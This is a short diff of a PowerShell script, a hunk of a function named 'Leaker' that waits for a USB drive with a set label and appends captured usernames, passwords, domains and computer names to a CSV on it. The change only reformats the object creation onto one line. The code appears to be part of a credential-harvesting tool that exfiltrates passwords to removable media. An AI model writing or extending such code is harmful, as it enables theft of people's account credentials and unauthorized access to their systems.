@@ -155,12 +155,8 @@ function Leaker($domain,$username,$password,$ComputerName){
                 } while ($driveLabel -ne $usblabel) 
                 Unregister-Event -SourceIdentifier volumeChange 
             }
-                    New-Object -TypeName PSCustomObject -Property @{
-                    Username = $username
-                    Password = $password
-                    Domain   = $domain
-                    Computer = $ComputerName
-                    } | Select-Object Username,Password,Computer,Domain | Export-Csv -Path $path$filename -NoTypeInformation -Append  
+                    New-Object -TypeName PSCustomObject -Property @{Username=$username; Password=$password; Domain=$domain; Computer=$ComputerName}
+                     | Select-Object Username,Password,Computer,Domain | Export-Csv -Path $path$filename -NoTypeInformation -Append  
 
             }
 
